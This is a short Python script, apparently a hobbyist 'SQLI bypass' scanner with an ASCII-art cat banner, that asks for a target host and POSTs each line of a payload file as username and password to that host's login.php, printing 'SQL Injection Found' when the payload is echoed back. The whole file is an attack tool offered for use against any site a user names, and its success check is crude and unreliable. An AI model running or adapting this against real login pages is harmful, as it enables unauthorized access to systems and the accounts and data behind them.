import requests
import colorama
import os
from colorama import *

os.system('clear')

print('''
                _                       
                \`*-.                *KSVD Hunt*
                 )  _`-.                
                .  : `. .               
                : _   '  \              
                ; *` _.   `*-._         
                `-.-'          `-.      
                  ;       `       `.    
                  :.       .        \   
                  . \  .   :   .-'   .  
                  '  `+.;  ;  '      :  
                  :  '  |    ;       ;-.
                  ; '   : :`-:     _.`* ;
               .*' /  .*' ; .*`- +'  `*'
               `*-*   `*-*  `*-*' 
       __QQ
      (_)_">
     _)          
                    Kitty Scanner Vulnerability SQLI Bypass. by KazuKo (BETA)
            ''')

def sqlil():
    # URL de la page de connexion
    target_url = input('[-] ~ Enter a mice homename :  ')
    os.system('clear')

    # Liste de payloads à tester
    with open('payload/sqlilog.txt', 'r') as f:
        payloads = f.readlines()

    # Boucle sur chaque payload
    for payload in payloads:
        # Données à envoyer dans la requête POST
        data = {
            "u": payload,
            "p": payload,
            "username": payload,
            "password": payload,
        }

        # Envoi de la requête POST
        response = requests.post('http://'+target_url+'login.php', data=data)

        # Vérification de la réponse du serveur
        
        if payload in response.text:
            print(Fore.GREEN+'---------------------------------------------------')
            print(f'SQL Injection Found ! :3 ')
            print(f'payload used : {payload}')
            print(Fore.GREEN+'---------------------------------------------------')
        else:
            print(Fore.RED+f'This payload dont work {payload}')
